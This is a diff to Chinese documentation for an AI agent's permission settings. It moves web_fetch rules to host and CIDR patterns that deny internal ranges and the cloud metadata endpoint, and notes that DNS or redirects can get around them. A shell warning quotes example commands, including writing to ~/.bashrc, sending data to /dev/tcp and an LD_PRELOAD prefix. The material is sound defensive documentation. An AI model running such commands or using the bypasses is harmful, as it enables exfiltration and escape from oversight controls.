@@ -30,8 +30,10 @@ permission:
   delegate: deny
   delete: ask
   web_fetch:
-    "http://localhost:8000/*": ask
-    "http://169.254.169.254/*": deny
+    "localhost:8000": ask
+    "169.254.0.0/16": deny
+    "10.0.0.0/8": deny
+    "192.168.0.0/16": deny
   shell:
     "sudo *": ask
     "rm *": ask
@@ -48,6 +50,28 @@ permission:
 ```
 
 这套配置的含义：默认允许大多数工具；禁用 `handoff` 与 `delegate`；删除文件、选定的 WebFetch URL pattern、以及常见高风险 shell/git 命令需要确认。权限规则按「最后匹配优先」生效，因此 `web_fetch` 和 `shell` 下更具体的规则会覆盖顶层 `"*": allow`。适合单人、可信工作区；共享仓库、团队服务或自动化 headless 部署应进一步收紧。本页以 `"*": allow` 作为可信工作区基线；若想改用最小授权基线，[配置 — Agent 配置](./configuration_CN.md#agent-配置)中的 `builder` agent 从 `"*": deny` 起步，只对角色确需的工具逐项放开。按你的信任模型选择基线即可。
+
+### WebFetch 目标匹配
+
+`web_fetch` 的规则 pattern 按网络语义匹配主机，形如 `host[:port]`：
+
+- **host（主机）**：域名（`example.com`）、域名通配（`*.internal`、`*`）、单个 IP（`127.0.0.1`、`::1`），或 CIDR 网段（`10.0.0.0/8`、`169.254.0.0/16`、`fd00::/8`）。IPv6 地址或 IPv6 CIDR 指定端口时需要方括号，例如 `[fd00::/8]:443`。
+- **port（端口）**：省略或写 `*` 表示任意；可以是单个端口（`8080`）或范围（`8000-9000`）。请求 URL 未写端口时按其协议取默认（http→80、https→443）。
+- 不支持 scheme（协议）和 path（路径）pattern。
+
+```yaml
+web_fetch:
+  "*": allow                  # 默认放行一切
+  "0.0.0.0/8": deny
+  "10.0.0.0/8": deny
+  "127.0.0.0/8": deny
+  "169.254.0.0/16": deny      # 云元数据 endpoint
+  "192.168.0.0/16": deny
+  "*:8000-9000": ask         # 任意主机的这些端口需确认
+  "*.internal": deny         # 内网域名
+```
+
+匹配发生在**请求发出之前**，针对模型给出的 URL；**不会**按解析后的连接 IP 复检。因此域名解析到内网地址、或 HTTP 重定向到内网，都**不会**被 IP/CIDR 规则拦住。请把这类规则视为意图层面的管控，而非网络沙箱。
 
 ### 特殊权限语义
 
@@ -75,6 +99,8 @@ permission:
 
 对于 `shell`，像 `"git *": allow` 这样的具体 `allow` pattern 不会自动放行包含未引用 shell 分隔符（`;`、`&&`、`||`、`|`、`&` 或换行）的复合命令。这类调用会继续匹配后续规则，通常回到 `ask` 或 `deny`。这只是安全兜底，不是 shell 沙箱；`shell: allow` 或 `shell: { "*": allow }` 这类宽泛规则只应给完全可信的角色使用。
 
+但一条针对具体命令的 `allow` 会覆盖该命令的全部能力，包括输出重定向和内联的环境变量赋值前缀。若放行了 `echo *`，那么 `echo secret > ~/.bashrc`、`echo x >> file`、`data > /dev/tcp/host/port`、`LD_PRELOAD=./x.so echo hi` 都会被允许——重定向目标和环境变量前缀属于这一条 shell 命令的组成部分，而非独立的工具调用，因此不会被单独匹配或管控。只有当你能接受某命令的最坏情况（通过重定向任意写文件、覆盖环境变量）时，才给它命令级 `allow`；否则保持 `ask`。
+
 ## Shell 与 shell 风险
 
 `shell` 能执行系统命令，应格外谨慎。`shell` 和 `spawn` 都是刻意设计的非交互工具：Chord 不会把模型可控的 stdin 接入子进程；Unix 子进程会在没有 controlling TTY 的环境中运行；高置信的交互式命令会在执行前被拒绝。普通 stdin 读取（如 shell `read`/`select`）会看到 EOF，而不是等待模型输入；如果命令需要输入，请通过 pipe、here-doc、文件或参数显式提供。登录向导、终端编辑器、pager / 全屏 TUI、密码提示、以及需要 `/dev/tty` 的命令，应在真实终端中手动执行，或改写为显式提供输入/参数的非交互命令。
@@ -97,7 +123,7 @@ permission:
 建议：
 
 - 默认把文件删除、批量改写、网络下载、数据库操作保留为 `ask` 或 `deny`
-- 如需管控本地/内网服务或敏感 endpoint，使用 `web_fetch` URL pattern，例如 `web_fetch: { "http://localhost:8000/*": ask }`
+- 如需管控本地/内网服务或敏感 endpoint，使用 `web_fetch` pattern——按主机/端口（`web_fetch: { "localhost:8000": ask }`）或按地址段（`web_fetch: { "169.254.0.0/16": deny, "*:8000-9000": ask }`）
 - 仅对少量可预期的开发命令设置 `allow`
 - 不要把权限匹配理解为安全沙箱
 
